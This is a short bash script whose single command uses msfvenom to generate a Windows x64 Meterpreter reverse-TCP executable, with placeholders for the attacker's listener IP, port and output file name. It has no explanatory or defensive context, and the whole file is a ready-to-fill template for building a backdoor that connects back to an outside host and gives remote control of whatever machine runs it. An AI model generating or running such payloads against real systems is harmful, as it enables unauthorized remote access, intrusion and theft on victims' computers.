#!/bin/bash

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f .exe -o [output.exe]
